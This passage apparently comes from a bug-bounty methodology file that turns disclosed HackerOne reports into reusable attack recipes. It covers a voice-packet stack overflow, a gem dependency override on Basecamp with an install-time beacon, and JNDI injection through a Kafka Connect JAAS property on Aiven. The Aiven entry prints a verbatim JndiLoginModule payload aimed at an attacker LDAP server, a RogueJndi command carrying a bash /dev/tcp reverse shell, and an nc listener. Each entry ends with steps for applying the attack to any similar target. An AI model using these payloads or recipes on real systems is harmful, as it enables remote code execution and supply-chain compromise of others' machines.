DETECTION SIGNAL: a client-side handler for a peer-supplied channel (voice/chat/avatar/state/RPC) copying a peer-declared length into a fixed stack array (`char buf[N]; ReadBits(buf, msg->len)` / `memcpy(buf, src, msg->len)`) with no `if (len > sizeof(buf))`; length in BITS while the buffer is in BYTES. DISTINCT FROM §17.68/#463286 (unbounded copy in a client-parsed ASSET FILE) and §17.64/#807772 (network-message index OOB READ + stride wrap): this is a peer-controlled WRITE straight off the network channel.
CHAIN: co-player → crafted voice packet with a `m_nLength` beyond the 4096-byte buffer → stack overflow on the receiving client → RCE on the victim's machine.
TRANSFERABLE TEST: on any networked client, find the frame/voice/chat handler that copies a packet field into a fixed stack buffer and send ONE packet whose declared length exceeds it (len = sizeof(buf)+1, then a cyclic 8k pattern to read the crash offset); check the bits-vs-bytes confusion first (does the conversion happen only after the copy?).

### [Bugbountyskills.md] 17.94 Registry SOURCE-PRIORITY INVERSION — a LEGITIMATE internal package is overridden by a same-named public copy (global sources / transitive dep / old Bundler) -> RCE on install; the hand `gem install` path is the delivery (Basecamp #1104874)

SOURCE: https://hackerone.com/reports/1104874 — Basecamp, "Insecure Bundler configuration fetching internal Gems (okra) from Rubygems.org" (weakness "Command Injection - Generic"; High 7~8.9; $5,000; reporter zofrex; asset `3.basecamp.com`; disclosed 2021-08-10)  read 2026-11-07 (full body 1,670 B from the local disclosed-reports dataset mirror `/tmp/h1_train.parquet`, `visibility: full`, + the live page via `r.jina.ai`, 40,302 chars incl. the vendor's root-cause reply and the Geminabox fix)
CLASS: supply-chain RCE via registry source-priority inversion (dependency confusion's sibling — OVERRIDE, not squatting)
CORE METHOD:
  1. Find an internal-only gem in use by the target (`okra`) whose name is not on Rubygems.org.
  2. Publish a same-named public gem at a HIGHER version (`okra-90002.0`) whose install-time code beacons back (hostname/user) — installed on `oscillatinghost` as `fernando`, i.e. INSIDE the corp network.
  3. Mechanism: (a) the `Gemfile` uses GLOBAL sources so the public version "trumps" the internal one, or (b) `okra` is a TRANSITIVE dep of another internal gem and Bundler < 2.2.10 (Bundler's 2021-02-15 source-priority fix is what stops a remote gem overriding a local same-name gem for transitive deps).
  4. Delivery nuance: prod/Docker builds were mitigated — the hit came from a DEVELOPER running `gem install okra` BY HAND (no pinned source) instead of `bundle install`.
DETECTION SIGNAL: a `Gemfile`/`gemfile.lock` with a GLOBAL `source`; Bundler < 2.2.10 (`bundle --version`); a pass-through internal gem proxy (Geminabox/Artifactory) that prefers the remote copy; a dependency graph where an internal gem depends on another internal gem; docs/scripts that say `gem install <name>` (unpinned). Generalises to npm (`registry.npmjs.org` fallback), pip (`--extra-index-url` precedence), Maven.
CHAIN: internal-name hijack/override -> attacker's higher-version public gem resolved by Bundler or a hand install -> install-time code runs in the corp network -> RCE on the build/dev machine -> supply-chain compromise (High, $5,000). Fix: pin the default registry on dev machines and make the proxy never prefer a remote same-name gem (Geminabox PR "never prefer a remote gem when a local gem with the same name is available, regardless of version").
TRANSFERABLE TEST: list internal package names (lockfile/CI logs/leaked manifests), check each on the public registry, publish a benign canary at 99.99.99 with a DNS-beacon install hook and watch for a callback — AND always run the version-priority test (a global source or a transitive dep on old Bundler can hand resolution to the public copy even when the internal package EXISTS). RELATED-BUT-DISTINCT from the recorded dependency-confusion entry (#925585 PayPal npm), which squats an UNCLAIMED name.

### [Bugbountyskills.md] 17.98 An attacker-settable CONNECTOR CONFIG value names a JDK JAAS login module (`com.sun.security.auth.module.JndiLoginModule`) -> the worker connects to an attacker LDAP server -> LDAP response deserialized -> gadget chain -> RCE (Aiven Kafka Connect #1529790)

SOURCE: https://hackerone.com/reports/1529790 — Aiven Ltd, "Kafka Connect RCE via connector SASL  JAAS JndiLoginModule configuration" (Deserialization of Untrusted Data; scope "Aiven for Apache Kafka managed and hosted service", max severity critical; $5,000; reporter jarij; disclosed 2022-11-08)  read 2026-11-07 (route: full researcher body, 1,774 B, `visibility: full`, from the local disclosed-reports dataset mirror `/tmp/h1_train.parquet`; the live page does not render from this egress — `web_extract` returns "the page was reached but content could not be extracted" — and PoC host/script values are redacted ████ in the published body)
CLASS: RCE via JNDI injection through a configuration property (CWE-502 / CWE-917) — attacker-controlled config string reaches a class that performs an LDAP lookup and deserializes the response
CORE METHOD:
  1. Find a managed connector/worker plane whose connector CONFIGURATION VALUES you can write: the Aiven API or the Kafka Connect REST API (`PUT/POST /connectors/<name>/config`).
  2. Pick a connector that builds its OWN internal producer/session (here `io.debezium.connector.mysql.MySqlConnector`; report: "likely true for other debezium connectors too") and set the SASL JAAS property to an attacker-chosen LOGIN MODULE NAME, verbatim:
     `database.history.producer.sasl.jaas.config` = `"com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://attacker_server" useFirstPass="true" serviceName="x" debug="true" group.provider.url="xxx";"`
  3. The worker instantiates the JDK's own `JndiLoginModule`; `user.provider.url` is an LDAP URL, so the Kafka Connect server CONNECTS OUT to the attacker's LDAP server — "the server will connect to the attacker's LDAP server and it deserializes the LDAP response, which the attacker can use to execute java deserialization gadget chains on the kafka connect server".
  4. Serve a gadget from that LDAP referral/reference. PoC tooling in the report: `java -jar RogueJndi-1.1.jar --hostname <attacker> -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/<attacker>/4445<&1"` with `nc -nlvp 4445` waiting; the reporter's own `python3 poc.py` fires it.
  5. JVM-version engineering (report's own note, useful when the classic chain is patched): a `System.setProperty` gadget in the **Scala standard library** re-enabled unsafe deserialization of commons-collections transformers, then CommonsCollections7 ran the reverse shell — "designed for the Scala version 2.13.6. It may fail on other scala versions."
DETECTION SIGNAL: a managed/SaaS connector platform where ARBITRARY connector properties are writable (Kafka Connect/MM2, Debezium, Flink, NiFi, Camel, Airbyte, JDBC/HTTP sink-sourced connectors); ANY property whose VALUE names a class, login module, driver, factory or URL (`*.sasl.jaas.config`, `*.jaas.config`, `loginModule`, `user.provider.url`, `provider.url`, `connection.url`, `*.security.protocol`, truststore/SSL, script/UDF/entry-class/classloader paths); outbound LDAP (389/1389) or RMI from the worker to the internet — the connect-back IS the proof.
CHAIN: tenant-level access to a managed Kafka Connect -> set `database.history.producer.sasl.jaas.config` to `JndiLoginModule … user.provider.url="ldap://attacker" …` on a Debezium connector -> worker performs a JAAS/JNDI LDAP lookup out to the attacker -> LDAP response deserialized -> gadget chain (Scala `System.setProperty` + CommonsCollections7) in the Connect JVM -> command execution on the Connect host + reach into the surrounding network, ending in a reverse shell (Deserialization of Untrusted Data; $5,000).
TRANSFERABLE TEST: on any product where you can submit a connector/plugin configuration, replace the value of every class/module/URL-bearing property with `com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://<your-collaborator>" useFirstPass="true" serviceName="x" debug="true" group.provider.url="x";` while running a listener — an LDAP/RMI connect-back FROM THE WORKER is JNDI injection; then serve a serialized-gadget referral (RogueJndi/ysoserial, or a version-specific gadget for Scala/patched JDKs). Also try dropping `ldap://`/`rmi://`/`dns://` straight into any `*provider.url`/`*lookup*`/`jndi*`/`*factory*` property to skip JAAS entirely.
WHY IT IS A NEW GENERAL METHOD: the recorded Aiven entry (§13.6, #1547877) reaches RCE with a JDBC-driver FILE WRITE plus HTTP-sink SSRF to localhost Jolokia `jvmtiAgentLoad`; here there is NO SSRF and NO file write — a single CONNECTOR PROPERTY VALUE is the whole primitive. The transferable idea: connector/plugin configuration is CODE-EXECUTION SURFACE, and any property whose value names a CLASS, MODULE or URL is a loader; JNDI-capable JDK login modules (`JndiLoginModule`) turn a config string into an outbound LDAP fetch plus deserialization.

